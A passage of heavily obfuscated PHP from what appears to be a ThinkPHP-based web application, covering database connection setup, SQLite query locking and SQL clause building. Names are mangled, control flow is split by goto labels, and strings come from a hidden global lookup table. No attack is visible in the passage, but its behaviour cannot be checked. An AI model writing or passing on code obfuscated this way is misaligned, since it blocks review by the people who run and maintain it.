$f³ƒõËìÕ‰[33]; } } $aÒÔš«ëò = array_merge($aÒÔš«ëò, $dÌŠÑ£…†¾, array($eåÛ›Ş³ . $f³ƒõËìÕ‰[33])); goto BŒÑİ·Ê†‡; BÃ—î˜˜§ö: $cùÜƒ° = Model($f³ƒõËìÕ‰[752])->sourceListInfo($aÒÔš«ëò, !0); foreach ($f²Òª‘Îôµ as &$Eæí¯Í¦Å) { if ($Eæí¯Í¦Å[$f³ƒõËìÕ‰[29]] == $f³ƒõËìÕ‰[492] && isset($Eæí¯Í¦Å[$f³ƒõËìÕ‰[405]][$f³ƒõËìÕ‰[1001]])) { $Eæí¯Í¦Å[$f³ƒõËìÕ‰[405]][$f³ƒõËìÕ‰[1001]] = $cùÜƒ°[$Eæí¯Í¦Å[$f³ƒõËìÕ‰[405]][$f³ƒõËìÕ‰[1001]]]; $Eæí¯Í¦Å[$f³ƒõËìÕ‰[405]][$f³ƒõËìÕ‰[1002]] = $cùÜƒ°[$Eæí¯Í¦Å[$f³ƒõËìÕ‰[405]][$f³ƒõËìÕ‰[1002]]]; } if ($Eæí¯Í¦Å[$f³ƒõËìÕ‰[29]] == $f³ƒõËìÕ‰[2291] && isset($Eæí¯Í¦Å[$f³ƒõËìÕ‰[405]][$f³ƒõËìÕ‰[369]])) { $Eæí¯Í¦Å[$f³ƒõËìÕ‰[405]][$f³ƒõËìÕ‰[369]] = $cùÜƒ°[$Eæí¯Í¦Å[$f³ƒõËìÕ‰[405]][$f³ƒõËìÕ‰[369]]]; } $Eæí¯Í¦Å[$f³ƒõËìÕ‰[391]] = $cùÜƒ°[$Eæí¯Í¦Å[$f³ƒõËìÕ‰[369]]]; $Eæí¯Í¦Å[$f³ƒõËìÕ‰[2296]] = $cùÜƒ°[$Eæí¯Í¦Å[$f³ƒõËìÕ‰[2283]]]; if ($Eæí¯Í¦Å[$f³ƒõËìÕ‰[29]] == $f³ƒõËìÕ‰[2065]) { $Eæí¯Í¦Å[$f³ƒõËìÕ‰[2296]] = $Eæí¯Í¦Å[$f³ƒõËìÕ‰[391]]; $Eæí¯Í¦Å[$f³ƒõËìÕ‰[2283]] = $Eæí¯Í¦Å[$f³ƒõËìÕ‰[2296]][$f³ƒõËìÕ‰[369]]; $Eæí¯Í¦Å[$f³ƒõËìÕ‰[391]] = !1; $Eæí¯Í¦Å[$f³ƒõËìÕ‰[369]] = $f³ƒõËìÕ‰[33]; } $Eæí¯Í¦Å[$f³ƒõËìÕ‰[2239]] = $bÔ¯òñ³Â[$Eæí¯Í¦Å[$f³ƒõËìÕ‰[1431]]]; } $A‘Á¼•»¸‰[$f³ƒõËìÕ‰[354]] = $f²Òª‘Îôµ; goto d—±ë²·ƒ“; BŒÑİ·Ê†‡: $aÒÔš«ëò = array_unique($aÒÔš«ëò); $A¸©»åÃ· = array_unique(array_to_keyvalue($f²Òª‘Îôµ, $f³ƒõËìÕ‰[33], $f³ƒõËìÕ‰[1431])); $bÔ¯òñ³Â = Model($f³ƒõËìÕ‰[477])->userListInfo($A¸©»åÃ·); goto BÃ—î˜˜§ö; c›·›‹³ø²: $f³ƒõËìÕ‰ =& $_SERVER[îÖ]; $f²Òª‘Îôµ = $A‘Á¼•»¸‰[$f³ƒõËìÕ‰[354]]; $aÒÔš«ëò = array_to_keyvalue($f²Òª‘Îôµ, $f³ƒõËìÕ‰[33], $f³ƒõËìÕ‰[369]); goto DÒìˆÅÍ’À; eïÖ¨¤íã©: } public function removeBySource($f’Å·‡â¬) { $eÛŞ‰©ãˆ = array($_SERVER[îÖ][383] => $f’Å·‡â¬); $this->where($eÛŞ‰©ãˆ)->remove(); } } goto B‡ãĞƒ™Õ‡; f¦ÅÖ’»Æ‡: class DbSqlite3 extends DbSqlite3Base { public function query($CÛù¶İãÜ) { goto e³¥˜èšä¦; AäŒáŒÊÕã: fclose($D²‡ÌñÙŸá); show_json($e—³£×Š‚É[868], !1); return !1; goto cì—ƒÎœÌà; bˆ“ï™¨í¼: if (!$D²‡ÌñÙŸá) { return !1; } if (flock($D²‡ÌñÙŸá, LOCK_EX)) { $F…Û¡ËâÖ— = parent::query($CÛù¶İãÜ); flock($D²‡ÌñÙŸá, LOCK_UN); fclose($D²‡ÌñÙŸá); return $F…Û¡ËâÖ—; } flock($D²‡ÌñÙŸá, LOCK_UN); goto AäŒáŒÊÕã; e³¥˜èšä¦: $e—³£×Š‚É =& $_SERVER[îÖ]; $f£¤§«ê¼è = DATA_PATH . $e—³£×Š‚É[866]; $D²‡ÌñÙŸá = fopen($f£¤§«ê¼è, $e—³£×Š‚É[867]); goto bˆ“ï™¨í¼; cì—ƒÎœÌà: } public function execute($B»óÌÂĞÆø) { goto F›ŠØ’Äô®; F›ŠØ’Äô®: $EÁ§‚ºšê =& $_SERVER[îÖ]; $E•õë¢Ç† = DATA_PATH . $EÁ§‚ºšê[866]; $F×Ê‚Øã² = fopen($E•õë¢Ç†, $EÁ§‚ºšê[867]); goto f‘‡ƒö¢ÜÈ; cÁ‹†ô¹Ôê: fclose($F×Ê‚Øã²); show_json($EÁ§‚ºšê[868], !1); return !1; goto BÓ…öô¥ÄÏ; f‘‡ƒö¢ÜÈ: if (!$F×Ê‚Øã²) { return !1; } if (flock($F×Ê‚Øã², LOCK_EX)) { $fğ»ˆÈ–Š = parent::execute($B»óÌÂĞÆø); flock($F×Ê‚Øã², LOCK_UN); fclose($F×Ê‚Øã²); return $fğ»ˆÈ–Š; } flock($F×Ê‚Øã², LOCK_UN); goto cÁ‹†ô¹Ôê; BÓ…öô¥ÄÏ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\161" => "\74\76", "\147\164" => "\76", "\x65\x67\164" => "\76\x3d", "\154\x74" => "\x3c", "\145\x6c\164" => "\74\75", "\156\157\x74\x6c\151\x6b\145" => "\116\117\x54\40\114\111\x4b\x45", "\154\x69\153\x65" => "\x4c\x49\x4b\x45", "\151\x6e" => "\111\116", "\156\157\164\151\x6e" => "\116\117\x54\x20\x49\x4e", "\x6e\x6f\164\40\151\156" => "\x4e\117\x54\x20\x49\116", "\142\145\164\x77\x65\145\x6e" => "\102\105\x54\x57\105\x45\116", "\x6e\157\164\142\145\x74\x77\145\x65\156" => "\116\117\124\x20\102\x45\x54\127\105\105\x4e", "\156\x6f\x74\x20\x62\145\x74\167\x65\145\156" => "\116\x4f\x54\x20\102\105\124\127\105\x45\116"); protected $selectSql = "\x53\x45\x4c\x45\x43\124\45\x44\x49\123\x54\x49\x4e\103\x54\x25\x20\x25\106\111\105\x4c\x44\45\40\x46\x52\117\115\x20\x25\x54\101\x42\114\x45\45\x25\112\x4f\111\x4e\45\45\x57\110\x45\122\105\45\45\107\122\117\125\120\45\45\110\x41\x56\111\116\x47\45\45\x4f\122\x44\105\122\45\x25\114\x49\115\111\x54\45\x20\x25\125\116\x49\117\116\45\45\x43\117\x4d\115\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $bÛª§Â¿‘ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[îÖ][869], $bÛª§Â¿‘); } public function factory($eÇÛ´‹¥¤ = '') { goto E¯ó¡Àõ‚Æ; e¯Ø†ÀÑï—: $this->dbType = ucwords(strtolower($eÇÛ´‹¥¤[$a‡»†ŠÄİ[870]])); $fÛˆ©¿Ÿµ¢ = $a‡»†ŠÄİ[872] . $this->dbType; if (class_exists($fÛˆ©¿Ÿµ¢)) { $fî´Œ²®œ’ = new $fÛˆ©¿Ÿµ¢($eÇÛ´‹¥¤); if ($a‡»†ŠÄİ[723] != strtolower($eÇÛ´‹¥¤[$a‡»†ŠÄİ[870]])) { $fî´Œ²®œ’->dbType = strtoupper($this->dbType); } else { $fî´Œ²®œ’->dbType = $this->_getDsnType($eÇÛ´‹¥¤[$a‡»†ŠÄİ[822]]); } } else { think_exception(think_lang($a‡»†ŠÄİ[873]) . $a‡»†ŠÄİ[874] . $fÛˆ©¿Ÿµ¢); } goto däÉ«¹¢‘; E¯ó¡Àõ‚Æ: $a‡»†ŠÄİ =& $_SERVER[îÖ]; $eÇÛ´‹¥¤ = $this->parseConfig($eÇÛ´‹¥¤); if (empty($eÇÛ´‹¥¤[$a‡»†ŠÄİ[870]])) { think_exception(think_lang($a‡»†ŠÄİ[871])); } goto e¯Ø†ÀÑï—; däÉ«¹¢‘: return $fî´Œ²®œ’; goto aÛáÊ¿Ï’; aÛáÊ¿Ï’: } public function __call($F±¾¦É‘à, $dâ±œ´Ñ©’) { if (method_exists($this, $F±¾¦É‘à)) { return call_user_func_array(array($this, $F±¾¦É‘à), $dâ±œ´Ñ©’); } } protected function _getDsnType($F×êíŒ”…) { $B»Ø¶™ÆÍ = explode($_SERVER[îÖ][4], $F×êíŒ”…); $c‡”“ÄÊèÚ = strtoupper(trim($B»Ø¶™ÆÍ[0])); return $c‡”“ÄÊèÚ; } private function parseConfig($AÍÉ‹è§£§ = '') { $C¥ôÒàÄ«· =& $_SERVER[îÖ]; if (!empty($AÍÉ‹è§£§) && is_string($AÍÉ‹è§£§)) { $AÍÉ‹è§£§ = $this->parseDSN($AÍÉ‹è§£§); } elseif (is_array($AÍÉ‹è§£§)) { $AÍÉ‹è§£§ = array_change_key_case($AÍÉ‹è§£§); $AÍÉ‹è§£§ = array($C¥ôÒàÄ«·[870] => $AÍÉ‹è§£§[$C¥ôÒàÄ«·[722]], $C¥ôÒàÄ«·[795] => $AÍÉ‹è§£§[$C¥ôÒàÄ«·[875]], $C¥ôÒàÄ«·[796] => $AÍÉ‹è§£§[$C¥ôÒàÄ«·[876]], $C¥ôÒàÄ«·[793] => $AÍÉ‹è§£§[$C¥ôÒàÄ«·[877]], $C¥ôÒàÄ«·[794] => $AÍÉ‹è§£§[$C¥ôÒàÄ«·[878]], $C¥ôÒàÄ«·[17] => $AÍÉ‹è§£§[$C¥ôÒàÄ«·[879]], $C¥ôÒàÄ«·[822] => $AÍÉ‹è§£§[$C¥ôÒàÄ«·[724]], $C¥ôÒàÄ«·[13] => isset($AÍÉ‹è§£§[$C¥ôÒàÄ«·[880]]) ? $AÍÉ‹è§£§[$C¥ôÒàÄ«·[880]] : array()); } elseif (empty($AÍÉ‹è§£§)) { if (think_config($C¥ôÒàÄ«·[881]) && $C¥ôÒàÄ«·[723] != strtolower(think_config($C¥ôÒàÄ«·[882]))) { $AÍÉ‹è§£§ = $this->parseDSN(think_config($C¥ôÒàÄ«·[881])); } else { $AÍÉ‹è§£§ = array($C¥ôÒàÄ«·[870] => think_config($C¥ôÒàÄ«·[882]), $C¥ôÒàÄ«·[795] => think_config($C¥ôÒàÄ«·[883]), $C¥ôÒàÄ«·[796] => think_config($C¥ôÒàÄ«·[884]), $C¥ôÒàÄ«·[793] => think_config($C¥ôÒàÄ«·[885]), $C¥ôÒàÄ«·[794] => think_config($C¥ôÒàÄ«·[886]), $C¥ôÒàÄ«·[17] => think_config($C¥ôÒàÄ«·[234]), $C¥ôÒàÄ«·[822] => think_config($C¥ôÒàÄ«·[881]), $C¥ôÒàÄ«·[13] => think_config($C¥ôÒàÄ«·[887])); } } return $AÍÉ‹è§£§; } protected function initConnect($AÙ«ÂùàôŠ = true) { if (1 == think_config($_SERVER[îÖ][18])) { $this->_linkID = $this->multiConnect($AÙ«ÂùàôŠ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($CÄµµÔ¯–Ã = false) { $bĞ‰é©› =& $_SERVER[îÖ]; static $c‹ˆ„¥¡…‡ = array(); if (empty($c‹ˆ„¥¡…‡)) { foreach ($this->config as $bˆÛğëÑ‰ => $DöÆÓå¢°æ) { $c‹ˆ„¥¡…‡[$bˆÛğëÑ‰] = explode($bĞ‰é©›[47], $DöÆÓå¢°æ); } } if (think_config($bĞ‰é©›[888])) { if ($CÄµµÔ¯–Ã) { $Dîòğáï®é = floor(mt_rand(0, think_config($bĞ‰é©›[889]) - 1)); } else { if (is_numeric(think_config($bĞ‰é©›[890]))) { $Dîòğáï®é = think_config($bĞ‰é©›[890]); } else { $Dîòğáï®é = floor(mt_rand(think_config($bĞ‰é©›[889]), count($c‹ˆ„¥¡…‡[$bĞ‰é©›[793]]) - 1)); } } } else { $Dîòğáï®é = floor(mt_rand(0, count($c‹ˆ„¥¡…‡[$bĞ‰é©›[793]]) - 1)); } $aôŠ‹ùÃá“ = array($bĞ‰é©›[795] => isset($c‹ˆ„¥¡…‡[$bĞ‰é©›[795]][$Dîòğáï®é]) ? $c‹ˆ„¥¡…‡[$bĞ‰é©›[795]][$Dîòğáï®é] : $c‹ˆ„¥¡…‡[$bĞ‰é©›[795]][0], $bĞ‰é©›[796] => isset($c‹ˆ„¥¡…‡[$bĞ‰é©›[796]][$Dîòğáï®é]) ? $c‹ˆ„¥¡…‡[$bĞ‰é©›[796]][$Dîòğáï®é] : $c‹ˆ„¥¡…‡[$bĞ‰é©›[796]][0], $bĞ‰é©›[793] => isset($c‹ˆ„¥¡…‡[$bĞ‰é©›[793]][$Dîòğáï®é]) ? $c‹ˆ„¥¡…‡[$bĞ‰é©›[793]][$Dîòğáï®é] : $c‹ˆ„¥¡…‡[$bĞ‰é©›[793]][0], $bĞ‰é©›[794] => isset($c‹ˆ„¥¡…‡[$bĞ‰é©›[794]][$Dîòğáï®é]) ? $c‹ˆ„¥¡…‡[$bĞ‰é©›[794]][$Dîòğáï®é] : $c‹ˆ„¥¡…‡[$bĞ‰é©›[794]][0], $bĞ‰é©›[17] => isset($c‹ˆ„¥¡…‡[$bĞ‰é©›[17]][$Dîòğáï®é]) ? $c‹ˆ„¥¡…‡[$bĞ‰é©›[17]][$Dîòğáï®é] : $c‹ˆ„¥¡…‡[$bĞ‰é©›[17]][0], $bĞ‰é©›[822] => isset($c‹ˆ„¥¡…‡[$bĞ‰é©›[822]][$Dîòğáï®é]) ? $c‹ˆ„¥¡…‡[$bĞ‰é©›[822]][$Dîòğáï®é] : $c‹ˆ„¥¡…‡[$bĞ‰é©›[822]][0], $bĞ‰é©›[13] => isset($c‹ˆ„¥¡…‡[$bĞ‰é©›[13]][$Dîòğáï®é]) ? $c‹ˆ„¥¡…‡[$bĞ‰é©›[13]][$Dîòğáï®é] : $c‹ˆ„¥¡…‡[$bĞ‰é©›[13]][0]); return $this->connect($aôŠ‹ùÃá“, $Dîòğáï®é); } public function parseDSN($C„ø¦åÊ) { $d±¤Ëäïä =& $_SERVER[îÖ]; if (empty($C„ø¦åÊ)) { return !1; } $cÊºÑ¯ë—ç = parse_url($C„ø¦åÊ); if ($cÊºÑ¯ë—ç[$d±¤Ëäïä[168]]) { $E÷¹æ…« = array($d±¤Ëäïä[870] => $cÊºÑ¯ë—ç[$d±¤Ëäïä[168]], $d±¤Ëäïä[795] => isset($cÊºÑ¯ë—ç[$d±¤Ëäïä[535]]) ? $cÊºÑ¯ë—ç[$d±¤Ëäïä[535]] : $d±¤Ëäïä[33], $d±¤Ëäïä[796] => isset($cÊºÑ¯ë—ç[$d±¤Ëäïä[891]]) ? $cÊºÑ¯ë—ç[$d±¤Ëäïä[891]] : $d±¤Ëäïä[33], $d±¤Ëäïä[793] => isset($cÊºÑ¯ë—ç[$d±¤Ëäïä[169]]) ? $cÊºÑ¯ë—ç[$d±¤Ëäïä[169]] : $d±¤Ëäïä[33], $d±¤Ëäïä[794] => isset($cÊºÑ¯ë—ç[$d±¤Ëäïä[170]]) ? $cÊºÑ¯ë—ç[$d±¤Ëäïä[170]] : $d±¤Ëäïä[33], $d±¤Ëäïä[17] => isset($cÊºÑ¯ë—ç[$d±¤Ëäïä[75]]) ? substr($cÊºÑ¯ë—ç[$d±¤Ëäïä[75]], 1) : $d±¤Ëäïä[33]); } else { preg_match($d±¤Ëäïä[892], trim($C„ø¦åÊ), $aøŠ‘Áİ§Œ); $E÷¹æ…« = array($d±¤Ëäïä[870] => $aøŠ‘Áİ§Œ[1], $d±¤Ëäïä[795] => $aøŠ‘Áİ§Œ[2], $d±¤Ëäïä[796] => $aøŠ‘Áİ§Œ[3], $d±¤Ëäïä[793] => $aøŠ‘Áİ§Œ[4], $d±¤Ëäïä[794] => $aøŠ‘Áİ§Œ[5], $d±¤Ëäïä[17] => $aøŠ‘Áİ§Œ[6]); } $E÷¹æ…«[$d±¤Ëäïä[822]] = $d±¤Ëäïä[33]; return $E÷¹æ…«; } protected function debug() { $Dˆ’ÊƒõÍÎ =& $_SERVER[îÖ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Dˆ’ÊƒõÍÎ[893]; if (think_config($Dˆ’ÊƒõÍÎ[894])) { think_status($Dˆ’ÊƒõÍÎ[895]); think_trace($this->queryStr . $Dˆ’ÊƒõÍÎ[896] . think_status($Dˆ’ÊƒõÍÎ[20], $Dˆ’ÊƒõÍÎ[895], 6) . $Dˆ’ÊƒõÍÎ[897], $Dˆ’ÊƒõÍÎ[33], $Dˆ’ÊƒõÍÎ[898]); } } protected function parseLock($dóéŒÂœÜŒ = false) { $D½öïÉàí× =& $_SERVER[îÖ]; if (!$dóéŒÂœÜŒ) { return $D½öïÉàí×[33]; } if ($D½öïÉàí×[824] == $this->dbType) { return $D½öïÉàí×[899]; } return $D½öïÉàí×[900]; } protected function parseSet($BÎã¢‡šñí) { $CìÓÒŸğÊ¸ =& $_SERVER[îÖ]; foreach ($BÎã¢‡šñí as $e³›Çƒ›ãŒ => $aÃù˜àÌĞí) { if (is_array($aÃù˜àÌĞí) && $CìÓÒŸğÊ¸[285] == $aÃù˜àÌĞí[0]) { $C½ğÔ°¡‚“[] = $this->parseKey($e³›Çƒ›ãŒ) . $CìÓÒŸğÊ¸[901] . $aÃù˜àÌĞí[1]; } elseif (is_scalar($aÃù˜àÌĞí) || is_null($aÃù˜àÌĞí)) { $C½ğÔ°¡‚“[] = $this->parseKey($e³›Çƒ›ãŒ) . $CìÓÒŸğÊ¸[901] . $this->parseValue($aÃù˜àÌĞí); } } return $CìÓÒŸğÊ¸[902] . implode($CìÓÒŸğÊ¸[47], $C½ğÔ°¡‚“); } protected function bindParam($dš¨Üè¶ÒŒ, $BÓ»ÇÁé¼Ü) { $this->bind[$_SERVER[îÖ][4] . $dš¨Üè¶ÒŒ] = $BÓ»ÇÁé¼Ü; } protected function parseBind($a¹ì˜õ¦†Õ) { $a¹ì˜õ¦†Õ = array_merge($this->bind, $a¹ì˜õ¦†Õ); $this->bind = array(); return $a¹ì˜õ¦†Õ; } function parseKey(&$D‰¨Ôê¾¹Ó, $Aµ…á‘£§ = true) { if ($Aµ…á‘£§) { $D‰¨Ôê¾¹Ó = $this->parseKeyCheck($D‰¨Ôê¾¹Ó); } return $D‰¨Ôê¾¹Ó; } function parseKeyCheck($eÆ˜Ã»·°‰) { $Cƒ±²Î¾³ =& $_SERVER[îÖ]; $eÆ˜Ã»·°‰ = trim($eÆ˜Ã»·°‰); if (!preg_match($Cƒ±²Î¾³[903], $eÆ˜Ã»·°‰)) { think_exception($Cƒ±²Î¾³[904] . $eÆ˜Ã»·°‰); } return $eÆ˜Ã»·°‰; } protected function parseValue($bï†²àÚ„) { $E‘ñã›™Ô =& $_SERVER[îÖ]; if (is_string($bï†²àÚ„)) { $bï†²àÚ„ = $E‘ñã›™Ô[863] . $this->escapeString($bï†²àÚ„) . $E‘ñã›™Ô[863]; } elseif (isset($bï†²àÚ„[0]) && is_string($bï†²àÚ„[0]) && strtolower($bï†²àÚ„[0]) == $E‘ñã›™Ô[285]) { $bï†²àÚ„ = $this->escapeString($bï†²àÚ„[1]); } elseif (is_array($bï†²àÚ„)) { $bï†²àÚ„ = array_map(array($this, $E‘ñã›™Ô[864]), $bï†²àÚ„); } elseif (is_bool($bï†²àÚ„)) { $bï†²àÚ„ = $bï†²àÚ„ ? $E‘ñã›™Ô[83] : $E‘ñã›™Ô[468]; } elseif (is_null($bï†²àÚ„)) { $bï†²àÚ„ = $E‘ñã›™Ô[99]; } return $bï†²àÚ„; } protected function parseField($eŠ®·¥’æŠ) { $FÀ¢ÔŒ‹ë =& $_SERVER[îÖ]; if (is_string($eŠ®·¥’æŠ) && strpos($eŠ®·¥’æŠ, $FÀ¢ÔŒ‹ë[47])) { $eŠ®·¥’æŠ = explode($FÀ¢ÔŒ‹ë[47], $eŠ®·¥’æŠ); } if (is_array($eŠ®·¥’æŠ)) { $DŸÇÁ²ø’» = array(); foreach ($eŠ®·¥’æŠ as $F½÷¹‹„ì => $c‘šÔ˜ˆ°‘) { if (!is_numeric($F½÷¹‹„ì)) { $DŸÇÁ²ø’»[] = $this->parseKey($F½÷¹‹„ì) . $FÀ¢ÔŒ‹ë[905] . $this->parseKey($c‘šÔ˜ˆ°‘); } else { $DŸÇÁ²ø’»[] = $this->parseKey($c‘šÔ˜ˆ°‘); } } $F…”µ‹·† = implode($FÀ¢ÔŒ‹ë[47], $DŸÇÁ²ø’»); } elseif (is_string($eŠ®·¥’æŠ) && !empty($eŠ®·¥’æŠ)) { $F…”µ‹·† = $eŠ®·¥’æŠ; } else { $F…”µ‹·† = $FÀ¢ÔŒ‹ë[176]; } return $F…”µ‹·†; } protected function parseTable($B•ÃÍ±½Òº) { $d›ÈÚŒ£Ë” =& $_SERVER[îÖ]; if (is_array($B•ÃÍ±½Òº)) { $fÎãï•² = array(); foreach ($B•ÃÍ±½Òº as $bÊèä‹´ô¬ => $cÒ²¦¥¢‘¸) { if (!is_numeric($bÊèä‹´ô¬)) { $fÎãï•²[] = $this->parseKey($bÊèä‹´ô¬) . $d›ÈÚŒ£Ë”[50] . $this->parseKey($cÒ²¦¥¢‘¸); } else { $fÎãï•²[] = $this->parseKey($bÊèä‹´ô¬); } } $B•ÃÍ±½Òº = $fÎãï•²; } elseif (is_string($B•ÃÍ±½Òº)) { if (strstr($B•ÃÍ±½Òº, $d›ÈÚŒ£Ë”[50])) { return $B•ÃÍ±½Òº; } $B•ÃÍ±½Òº = explode($d›ÈÚŒ£Ë”[47], $B•ÃÍ±½Òº); array_walk($B•ÃÍ±½Òº, array($this, $d›ÈÚŒ£Ë”[812])); } return $d›ÈÚŒ£Ë”[906] . trim(implode($d›ÈÚŒ£Ë”[907], $B•ÃÍ±½Òº), $d›ÈÚŒ£Ë”[818]) . $d›ÈÚŒ£Ë”[906]; } protected function parseWhere($Dà”ÕÖ°’) { $A§Ô¨²á™™ =& $_SERVER[îÖ]; $D¯È—ù¤š‡ = $A§Ô¨²á™™[33]; if (is_string($Dà”ÕÖ°’)) { $D¯È—ù¤š‡ = $Dà”ÕÖ°’; } else { $f¿“¬ºøÆÂ = isset($Dà”ÕÖ°’[$A§Ô¨²á™™[908]]) ? strtoupper($Dà”ÕÖ°’[$A§Ô¨²á™™[908]]) : $A§Ô¨²á™™[33]; if (in_array($f¿“¬ºøÆÂ, array($A§Ô¨²á™™[909], $A§Ô¨²á™™[910], $A§Ô¨²á™™[911]))) { $f¿“¬ºøÆÂ = $A§Ô¨²á™™[50] . $f¿“¬ºøÆÂ . $A§Ô¨²á™™[50]; unset($Dà”ÕÖ°’[$A§Ô¨²á™™[908]]); } else { $f¿“¬ºøÆÂ = $A§Ô¨²á™™[912]; } foreach ($Dà”ÕÖ°’ as $Aô¢êé„Ëê => $BÓÒê‡©™²) { $D¯È—ù¤š‡ .= $A§Ô¨²á™™[265]; if (is_numeric($Aô¢êé„Ëê)) { $Aô¢êé„Ëê = $A§Ô¨²á™™[913]; } if (0 === strpos($Aô¢êé„Ëê, $A§Ô¨²á™™[70])) { $D¯È—ù¤š‡ .= $this->parseThinkWhere($Aô¢êé„Ëê, $BÓÒê‡©™²); } else { if (!preg_match($A§Ô¨²á™™[914], trim($Aô¢êé„Ëê))) { think_exception(think_lang($A§Ô¨²á™™[915]) . $A§Ô¨²á™™[4] . $Aô¢êé„Ëê); } $c ºˆ·¬­´ = is_array($BÓÒê‡©™²) && isset($BÓÒê‡©™²[$A§Ô¨²á™™[916]]); $Aô¢êé„Ëê = trim($Aô¢êé„Ëê); if (strpos($Aô¢êé„Ëê, $A§Ô¨²á™™[271])) { $F…øá»¢ôÑ = explode($A§Ô¨²á™™[271], $Aô¢êé„Ëê); $dè¿ó’Î˜Š = array(); foreach ($F…øá»¢ôÑ as $dà‰£ƒ«Ú° => $EÑõ§­«†) { $Aã›Ñ¿²ï = $c ºˆ·¬­´ ? $BÓÒê‡©™²[$dà‰£ƒ«Ú°] : $BÓÒê‡©™²; $dè¿ó’Î˜Š[] = $A§Ô¨²á™™[248] . $this->parseWhereItem($this->parseKey($EÑõ§­«†), $Aã›Ñ¿²ï) . $A§Ô¨²á™™[811]; } $D¯È—ù¤š‡ .= implode($A§Ô¨²á™™[917], $dè¿ó’Î˜Š); } elseif (strpos($Aô¢êé„Ëê, $A§Ô¨²á™™[272])) { $F…øá»¢ôÑ = explode($A§Ô¨²á™™[272], $Aô¢êé„Ëê); $dè¿ó’Î˜Š = array(); foreach ($F…øá»¢ôÑ as $dà‰£ƒ«Ú° => $EÑõ§­«†) { $Aã›Ñ¿²ï = $c ºˆ·¬­´ ? $BÓÒê‡©™²[$dà‰£ƒ«Ú°] : $BÓÒê‡©™²; $dè¿ó’Î˜Š[] = $A§Ô¨²á™™[248] . $this->parseWhereItem($this->parseKey($EÑõ§­«†), $Aã›Ñ¿²ï) . $A§Ô¨²á™™[811]; } $D¯È—ù¤š‡ .= implode($A§Ô¨²á™™[912], $dè¿ó’Î˜Š); } else { $D¯È—ù¤š‡ .= $this->parseWhereItem($this->parseKey($Aô¢êé„Ëê), $BÓÒê‡©™²); } } $D¯È—ù¤š‡ .= $A§Ô¨²á™™[266] . $f¿“¬ºøÆÂ; } $D¯È—ù¤š‡ = substr($D¯È—ù¤š‡, 0, -strlen($f¿“¬ºøÆÂ)); } return empty($D¯È—ù¤š‡) ? $A§Ô¨²á™™[33] : $A§Ô¨²á™™[918] . $D¯È—ù¤š‡; } protected function parseWhereItem($fòÄïÇÅÕ, $b ŠÊÉ²ªè) { $f¥è…ñ…® =& $_SERVER[îÖ]; $aó•¼Š‘  = $f¥è…ñ…®[33]; if (is_array($b ŠÊÉ²ªè)) { if (is_string($b ŠÊÉ²ªè[0])) { $dñ¤Øêº¬ = strtolower($b ŠÊÉ²ªè[0]); if (in_array($b ŠÊÉ²ªè[0], array($f¥è…ñ…®[901], $f¥è…ñ…®[919], $f¥è…ñ…®[920], $f¥è…ñ…®[921], $f¥è…ñ…®[922], $f¥è…ñ…®[923]))) { $aó•¼Š‘  .= $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $b ŠÊÉ²ªè[0] . $f¥è…ñ…®[50] . $this->parseValue($b ŠÊÉ²ªè[1]); } elseif (preg_match($f¥è…ñ…®[924], $b ŠÊÉ²ªè[0])) { $aó•¼Š‘  .= $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $this->exp[$dñ¤Øêº¬] . $f¥è…ñ…®[50] . $this->parseValue($b ŠÊÉ²ªè[1]); } elseif (preg_match($f¥è…ñ…®[925], $b ŠÊÉ²ªè[0])) { if (is_array($b ŠÊÉ²ªè[1])) { $BÄ’§ÌïÓ„ = isset($b ŠÊÉ²ªè[2]) ? strtoupper($b ŠÊÉ²ªè[2]) : $f¥è…ñ…®[910]; if (in_array($BÄ’§ÌïÓ„, array($f¥è…ñ…®[909], $f¥è…ñ…®[910], $f¥è…ñ…®[911]))) { $C›³»–š§Û = array(); foreach ($b ŠÊÉ²ªè[1] as $cóŞå¼Öæ) { $C›³»–š§Û[] = $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $this->exp[$dñ¤Øêº¬] . $f¥è…ñ…®[50] . $this->parseValue($cóŞå¼Öæ); } $aó•¼Š‘  .= $f¥è…ñ…®[248] . implode($f¥è…ñ…®[50] . $BÄ’§ÌïÓ„ . $f¥è…ñ…®[50], $C›³»–š§Û) . $f¥è…ñ…®[811]; } } else { $aó•¼Š‘  .= $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $this->exp[$dñ¤Øêº¬] . $f¥è…ñ…®[50] . $this->parseValue($b ŠÊÉ²ªè[1]); } } elseif ($f¥è…ñ…®[285] == $dñ¤Øêº¬) { $aó•¼Š‘  .= $f¥è…ñ…®[809] . $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $b ŠÊÉ²ªè[1] . $f¥è…ñ…®[926]; } elseif (preg_match($f¥è…ñ…®[927], $b ŠÊÉ²ªè[0])) { if (isset($b ŠÊÉ²ªè[2]) && $f¥è…ñ…®[285] == $b ŠÊÉ²ªè[2]) { $aó•¼Š‘  .= $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $this->exp[$dñ¤Øêº¬] . $f¥è…ñ…®[50] . $b ŠÊÉ²ªè[1]; } else { if (is_string($b ŠÊÉ²ªè[1])) { $b ŠÊÉ²ªè[1] = explode($f¥è…ñ…®[47], $b ŠÊÉ²ªè[1]); } $Cñ”ñ®ö¨ = implode($f¥è…ñ…®[47], $this->parseValue($b ŠÊÉ²ªè[1])); $aó•¼Š‘  .= $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $this->exp[$dñ¤Øêº¬] . $f¥è…ñ…®[809] . $Cñ”ñ®ö¨ . $f¥è…ñ…®[811]; } } elseif (preg_match($f¥è…ñ…®[928], $b ŠÊÉ²ªè[0])) { $Dòª˜ã›¡¬ = is_string($b ŠÊÉ²ªè[1]) ? explode($f¥è…ñ…®[47], $b ŠÊÉ²ªè[1]) : $b ŠÊÉ²ªè[1]; $aó•¼Š‘  .= 